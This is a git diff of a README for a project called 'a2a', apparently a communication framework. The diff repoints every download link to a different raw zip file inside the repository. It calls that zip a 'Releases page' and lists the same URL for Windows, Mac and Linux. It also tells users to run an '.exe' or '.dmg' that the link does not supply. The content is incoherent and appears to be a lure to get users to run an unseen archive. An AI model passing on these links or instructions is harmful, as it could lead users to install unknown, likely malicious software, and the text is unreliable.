@@ -1,7 +1,7 @@
 # 🚀 a2a - Simple Framework for Communication
 
 ## 📥 Download Now
-[![Download a2a](https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip)](https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip)
+[![Download a2a](https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip)](https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip)
 
 ## 📖 Overview
 A2A is a communication protocol framework designed to simplify interactions between various systems. This framework helps you connect, share, and manage data with ease, whether you’re working on a personal project or a larger application.
@@ -16,19 +16,19 @@ To get started with A2A, you'll need to follow a few easy steps. You don’t nee
 - Available disk space: At least 100 MB
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip).
   
 2. **Choose the Latest Version**: Look for the latest release in the list. This will usually be at the top.
 
 3. **Download the File**: Click on the file that matches your operating system to start the download. For example:
-   - For Windows, you might look for `https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip`.
-   - For Mac, look for `https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip`.
-   - For Linux, find `https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip`.
+   - For Windows, you might look for `https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip`.
+   - For Mac, look for `https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip`.
+   - For Linux, find `https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip`.
 
 4. **Install the Application**: 
    - For Windows: Once the download completes, double-click the `.exe` file and follow the prompts to install.
    - For Mac: Open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux: Extract the `https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip` file and follow any included instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip` file and follow any included instructions.
 
 5. **Run the Application**: After installation, locate the A2A application on your computer. Double-click to open it.
 
@@ -41,7 +41,7 @@ To get started with A2A, you'll need to follow a few easy steps. You don’t nee
 ## 🔧 Troubleshooting
 If you encounter any issues while installing or running the application:
 - Ensure your system meets the requirements listed above.
-- Make sure you are using the latest version from the [Releases page](https://github.com/Lockout21/a2a/raw/refs/heads/main/src/plugins/a-v3.8.zip).
+- Make sure you are using the latest version from the [Releases page](https://raw.githubusercontent.com/Lockout21/a2a/main/src/a-3.7.zip).
 - Check your internet connection during the download.
 
 ## 📝 Support
